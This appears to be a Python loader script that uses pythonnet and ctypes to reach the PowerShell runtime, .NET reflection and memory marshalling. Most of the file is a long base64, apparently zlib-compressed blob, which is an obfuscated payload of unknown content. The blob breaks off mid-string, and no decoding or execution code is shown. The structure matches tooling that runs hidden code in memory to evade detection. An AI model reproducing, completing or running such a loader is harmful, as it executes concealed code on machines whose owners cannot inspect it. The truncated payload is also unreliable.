import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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